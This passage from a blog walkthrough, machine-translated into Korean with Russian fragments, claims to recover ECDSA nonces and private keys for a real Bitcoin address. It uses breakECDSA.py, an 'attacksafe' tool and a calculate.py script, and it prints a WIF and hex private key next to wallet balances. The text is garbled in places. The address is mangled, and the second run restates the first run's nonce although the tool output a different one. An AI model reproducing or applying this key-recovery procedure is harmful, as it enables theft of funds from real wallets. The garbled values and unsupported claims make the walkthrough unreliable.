<figure class="wp-block-image"><a href="https://www.blockchain.com/btc/address/16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2" target="_blank" rel="noreferrer noopener"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-21-1024x459.png" alt="DDD" class="wp-image-867"/></a><figcaption class="wp-element-caption"><strong><a href="https://www.blockchain.com/btc/address/16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2" target="_blank" rel="noreferrer noopener">www.blockchain.com/btc/address/16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2</a></strong></figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>BALANCE: $ 711.91</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><code>№4</code></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>자세한 암호 분석을 통해 Bitcoin 주소에서 치명적인 취약점도 발견했습니다.</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/12Pm2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q" target="_blank" rel="noreferrer noopener">12시2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/ac6259da5eb98bf11b5cda804175ac666ebd1b7118da51d206936b43cb368542"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/ac6259da5eb98bf11b5cda804175ac666ebd1b7118da51d206936b43cb368542
</div></figure>
<!-- /wp:embed -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/4ff10d8a7246f0c46acb9fefa6ea23497f6b7825307414ca3fc80bcbae9194af"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/4ff10d8a7246f0c46acb9fefa6ea23497f6b7825307414ca3fc80bcbae9194af
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":667} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-7.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-667"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":668} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-8.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-668"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>공격을 위한 RawTX 준비</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/12Pm2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q" target="_blank" rel="noreferrer noopener">12시2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/ac6259da5eb98bf11b5cda804175ac666ebd1b7118da51d206936b43cb368542"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/ac6259da5eb98bf11b5cda804175ac666ebd1b7118da51d206936b43cb368542
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":883} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-22-1024x95.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-883"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>RawTX = 0100000001d5ecb7299d4005bc1c9bb2325de6428a882a6df8fefd74e740139a6b53bdb40e060000006b4830450221009cff5d8357756520391438c44415c706036e9e16d440cb8892e4b91423f0f67502204e8eaec16ebb4816d53cd08f882221c37db6aed27b5c77a0cb12455af91200ac012103c1915f97b2480c478e6b1111ae03c29f55013351a126b7f0cfbab4a34f3c712bffffffff010000000000000000046a02445300000000
</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>이제 모든 취약한 트랜잭션에서 모든 R, S, Z 값을 가져와야 합니다.</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>breakECDSA.py 스크립트를 사용해봅시다.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python2 breakECDSA.py 0100000001d5ecb7299d4005bc1c9bb2325de6428a882a6df8fefd74e740139a6b53bdb40e060000006b4830450221009cff5d8357756520391438c44415c706036e9e16d440cb8892e4b91423f0f67502204e8eaec16ebb4816d53cd08f882221c37db6aed27b5c77a0cb12455af91200ac012103c1915f97b2480c478e6b1111ae03c29f55013351a126b7f0cfbab4a34f3c712bffffffff010000000000000000046a02445300000000
</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1045} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-75-1024x256.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1045"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0x9cff5d8357756520391438c44415c706036e9e16d440cb8892e4b91423f0f675
S = 0x4e8eaec16ebb4816d53cd08f882221c37db6aed27b5c77a0cb12455af91200ac
Z = 0xccbd1c0f0ef3f70fb985e64184014998a8435078b7bb75e51ca6ae1c37aa30e1</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>취약한 ECDSA 서명 트랜잭션에서 비밀 키를 얻기 위해 데이터를&nbsp;<code>RawTX</code>텍스트 문서에 추가하고 파일로 저장해 봅시다.<code>RawTX.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>0100000001d5ecb7299d4005bc1c9bb2325de6428a882a6df8fefd74e740139a6b53bdb40e060000006b4830450221009cff5d8357756520391438c44415c706036e9e16d440cb8892e4b91423f0f67502204e8eaec16ebb4816d53cd08f882221c37db6aed27b5c77a0cb12455af91200ac012103c1915f97b2480c478e6b1111ae03c29f55013351a126b7f0cfbab4a34f3c712bffffffff010000000000000000046a02445300000000</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><code>-tool frey_ruck_attack</code>소프트웨어를 사용하여&nbsp;실행<code>“ATTACKSAFE SOFTWARE”</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./attacksafe -tool frey_ruck_attack -open RawTX.txt -save SecretKey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1047} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-76-1024x321.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1047"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>우리는 이 공격을 시작했고&nbsp;<code>-tool frey_ruck_attack</code>그 결과는 파일에 저장되었습니다.<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이제 성공적인 결과를 보려면 파일을 엽니다.<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1049} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-77-1024x453.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1049"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0x459733bf6c7972a0d894fe84e14b06803405e82d8fd1572d3376ff99049def4f

RawTX = 0100000001d5ecb7299d4005bc1c9bb2325de6428a882a6df8fefd74e740139a6b53bdb40e060000006b4830450221009cff5d8357756520391438c44415c706036e9e16d440cb8892e4b91423f0f67502204e8eaec16ebb4816d53cd08f882221c37db6aed27b5c77a0cb12455af91200ac012103c1915f97b2480c478e6b1111ae03c29f55013351a126b7f0cfbab4a34f3c712bffffffff010000000000000000046a02445300000000</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><code>"Deployments ECDSA"</code>우리는 비트코인 ​​블록체인 트랜잭션의 치명적인 취약점을 의미하는&nbsp;비문을 봅니다 .</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>SecretKey значение в формате HEX, это и есть наш секретный ключ "K" (NONCE):</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0x459733bf6c7972a0d894fe84e14b06803405e82d8fd1572d3376ff99049def4f</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><em>파이썬</em>&nbsp;스크립트&nbsp;로 확인하자<code>point2gen.py</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>ECPy</strong></a>&nbsp;타원 곡선 라이브러리를 사용해 봅시다&nbsp;.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이제 다음을 지정하여 스크립트를 실행해 보겠습니다&nbsp;<code>секретный ключ "K" (NONCE)</code>.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 point2gen.py 0x459733bf6c7972a0d894fe84e14b06803405e82d8fd1572d3376ff99049def4f</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1051} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-78-1024x92.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1051"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>(0x9cff5d8357756520391438c44415c706036e9e16d440cb8892e4b91423f0f675 , 0x79751db08bb33615fbdf6387f5f0f28c6702213eb20607e28760af1aaaeb273e)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>EC (secp256k1)&nbsp;</code>시그니처 값으로&nbsp;포인트 좌표 확인<code>R</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0x9cff5d8357756520391438c44415c706036e9e16d440cb8892e4b91423f0f675
S = 0x4e8eaec16ebb4816d53cd08f882221c37db6aed27b5c77a0cb12455af91200ac
Z = 0xccbd1c0f0ef3f70fb985e64184014998a8435078b7bb75e51ca6ae1c37aa30e1</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R          =    0x9cff5d8357756520391438c44415c706036e9e16d440cb8892e4b91423f0f675
point2gen  =   (0x9cff5d8357756520391438c44415c706036e9e16d440cb8892e4b91423f0f675 , 0x79751db08bb33615fbdf6387f5f0f28c6702213eb20607e28760af1aaaeb273e)
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><code>ВСЕ ВЕРНО!</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0x459733bf6c7972a0d894fe84e14b06803405e82d8fd1572d3376ff99049def4f</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이제 비밀 키를 알고 있으므로 비트코인 ​​지갑에 대한 개인 키를 얻을 수 있습니다.<code>12Pm2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><em>Python</em>&nbsp;스크립트를 사용합시다&nbsp;&nbsp;.&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; 개인 키 가져오기</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>코드를 열고 서명의 모든 값을 추가합시다<code><strong>K, R, S, Z</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0x459733bf6c7972a0d894fe84e14b06803405e82d8fd1572d3376ff99049def4f
R = 0x9cff5d8357756520391438c44415c706036e9e16d440cb8892e4b91423f0f675
S = 0x4e8eaec16ebb4816d53cd08f882221c37db6aed27b5c77a0cb12455af91200ac
Z = 0xccbd1c0f0ef3f70fb985e64184014998a8435078b7bb75e51ca6ae1c37aa30e1


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>스크립트는 다음 공식을 사용하여 개인 키를 계산합니다.</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>스크립트를 실행해 봅시다:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 calculate.py</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1053} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-79.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1053"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>PrivKey = 4d063c9a389df945ede5fa1a5d19408944d74d449d722548b3d8c80606e05b06</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">bitaddress를</a></strong>&nbsp;열고&nbsp;다음을 확인합니다.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ADDR: 12Pm2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q
WIF:  KyoSFYtgbsWxtfFZmMfbkwFTXhqfGgxztVgmuN1dFrPqs3nFCqcr
HEX:  4d063c9a389df945ede5fa1a5d19408944d74d449d722548b3d8c80606e05b06</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":886} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/a4.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-886"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:embed {"url":"https://www.blockchain.com/btc/address/12Pm2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://www.blockchain.com/btc/address/12Pm2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q
</div></figure>
<!-- /wp:embed -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><code>Приватный ключ найден!</code></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":889} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-23-1024x450.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-889"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>BALANCE: $ 706.27</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>BTC 코인을 잃을 수 있는 잠재적인 위협은 비트코인 ​​블록체인 트랜잭션의 치명적인 취약점에 있기 때문에 모든 사람이 항상 소프트웨어를 업데이트하고 검증된 장치만 사용할 것을 강력히 권장합니다.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>자세한 암호 분석을 통해 동일한 비트코인 ​​주소에 대해&nbsp;<strong><a href="https://btc1.trezor.io/tx/4ff10d8a7246f0c46acb9fefa6ea23497f6b7825307414ca3fc80bcbae9194af" target="_blank" rel="noreferrer noopener">4ff10d8a7246f0c46acb9fefa6ea23497f6b7825307414ca3fc80bcbae9194af</a></strong>&nbsp;에서 치명적인 취약점도 발견했습니다.<strong><code>&nbsp;TXID:</code></strong><strong><a href="https://btc1.trezor.io/tx/4ff10d8a7246f0c46acb9fefa6ea23497f6b7825307414ca3fc80bcbae9194af" target="_blank" rel="noreferrer noopener"></a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>공격을 위한 RawTX 준비</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/12Pm2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q" target="_blank" rel="noreferrer noopener">12시2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/4ff10d8a7246f0c46acb9fefa6ea23497f6b7825307414ca3fc80bcbae9194af"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/4ff10d8a7246f0c46acb9fefa6ea23497f6b7825307414ca3fc80bcbae9194af
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":894} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-24-1024x94.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-894"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>RawTX = 010000000171f0257c63793fe24cf20cecb7e77926e950287c535cd0f99a57d001630bee53160000006b4830450220481b75700708a950ce88c97a84d7eef9844642ae0406db86c6384da093b22996022100abd9db597dbaaf4866e8379fd1127c017fa904756e7aa8559831c75bd925037a012103c1915f97b2480c478e6b1111ae03c29f55013351a126b7f0cfbab4a34f3c712bffffffff010000000000000000046a02585800000000
</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>이제 모든 취약한 트랜잭션에서 모든 R, S, Z 값을 가져와야 합니다.</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>breakECDSA.py 스크립트를 사용해봅시다.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python2 breakECDSA.py 010000000171f0257c63793fe24cf20cecb7e77926e950287c535cd0f99a57d001630bee53160000006b4830450220481b75700708a950ce88c97a84d7eef9844642ae0406db86c6384da093b22996022100abd9db597dbaaf4866e8379fd1127c017fa904756e7aa8559831c75bd925037a012103c1915f97b2480c478e6b1111ae03c29f55013351a126b7f0cfbab4a34f3c712bffffffff010000000000000000046a02585800000000
</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1057} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-81-1024x253.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1057"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0x481b75700708a950ce88c97a84d7eef9844642ae0406db86c6384da093b22996
S = 0xabd9db597dbaaf4866e8379fd1127c017fa904756e7aa8559831c75bd925037a
Z = 0x6bd83b8efbba3aaeea89f4763a13f837181c42c82dfb223d8354f109b5ec65fe</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>취약한 ECDSA 서명 트랜잭션에서 비밀 키를 얻기 위해 데이터를&nbsp;<code>RawTX</code>텍스트 문서에 추가하고 파일로 저장해 봅시다.<code>RawTX.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>010000000171f0257c63793fe24cf20cecb7e77926e950287c535cd0f99a57d001630bee53160000006b4830450220481b75700708a950ce88c97a84d7eef9844642ae0406db86c6384da093b22996022100abd9db597dbaaf4866e8379fd1127c017fa904756e7aa8559831c75bd925037a012103c1915f97b2480c478e6b1111ae03c29f55013351a126b7f0cfbab4a34f3c712bffffffff010000000000000000046a02585800000000</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><code>-tool frey_ruck_attack</code>소프트웨어를 사용하여&nbsp;실행<code>“ATTACKSAFE SOFTWARE”</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./attacksafe -tool frey_ruck_attack -open RawTX.txt -save SecretKey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1059} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-82-1024x307.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1059"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>우리는 이 공격을 시작했고&nbsp;<code>-tool frey_ruck_attack</code>그 결과는 파일에 저장되었습니다.<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이제 성공적인 결과를 보려면 파일을 엽니다.<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1061} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-83-1024x459.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1061"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xad004724cdf368d6ffcc49791827c9157f533a53e687d7eae1547c848d49e1cd

RawTX = 010000000171f0257c63793fe24cf20cecb7e77926e950287c535cd0f99a57d001630bee53160000006b4830450220481b75700708a950ce88c97a84d7eef9844642ae0406db86c6384da093b22996022100abd9db597dbaaf4866e8379fd1127c017fa904756e7aa8559831c75bd925037a012103c1915f97b2480c478e6b1111ae03c29f55013351a126b7f0cfbab4a34f3c712bffffffff010000000000000000046a02585800000000</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><code>"Deployments ECDSA"</code>우리는 비트코인 ​​블록체인 트랜잭션의 치명적인 취약점을 의미하는&nbsp;비문을 봅니다 .</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>SecretKey значение в формате HEX, это и есть наш секретный ключ "K" (NONCE):</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0x459733bf6c7972a0d894fe84e14b06803405e82d8fd1572d3376ff99049def4f</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><em>파이썬</em>&nbsp;스크립트&nbsp;로 확인하자<code>point2gen.py</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>ECPy</strong></a>&nbsp;타원 곡선 라이브러리를 사용해 봅시다&nbsp;.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이제 다음을 지정하여 스크립트를 실행해 보겠습니다&nbsp;<code>секретный ключ "K" (NONCE)</code>.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 point2gen.py 0xad004724cdf368d6ffcc49791827c9157f533a53e687d7eae1547c848d49e1cd</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1062} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-84-1024x89.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1062"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>(0x481b75700708a950ce88c97a84d7eef9844642ae0406db86c6384da093b22996 , 0xbd48d7b4dc1d36c3e4e18ea398ce153f3ebf6ddf7824d0d0132e5dad85c3c69d)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>EC (secp256k1)&nbsp;</code>시그니처 값으로&nbsp;포인트 좌표 확인<code>R</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0x481b75700708a950ce88c97a84d7eef9844642ae0406db86c6384da093b22996
S = 0xabd9db597dbaaf4866e8379fd1127c017fa904756e7aa8559831c75bd925037a
Z = 0x6bd83b8efbba3aaeea89f4763a13f837181c42c82dfb223d8354f109b5ec65fe</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R          =    0x481b75700708a950ce88c97a84d7eef9844642ae0406db86c6384da093b22996
point2gen  =   (0x481b75700708a950ce88c97a84d7eef9844642ae0406db86c6384da093b22996 , 0xbd48d7b4dc1d36c3e4e18ea398ce153f3ebf6ddf7824d0d0132e5dad85c3c69d)
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><code>ВСЕ ВЕРНО!</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0xad004724cdf368d6ffcc49791827c9157f533a53e687d7eae1547c848d49e1cd</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이제 비밀 키를 알고 있으므로 비트코인 ​​지갑에 대한 개인 키를 얻을 수 있습니다.<code>12Pm2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><em>Python</em>&nbsp;스크립트를 사용합시다&nbsp;&nbsp;.&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; 개인 키 가져오기</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>코드를 열고 서명의 모든 값을 추가합시다<code><strong>K, R, S, Z</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


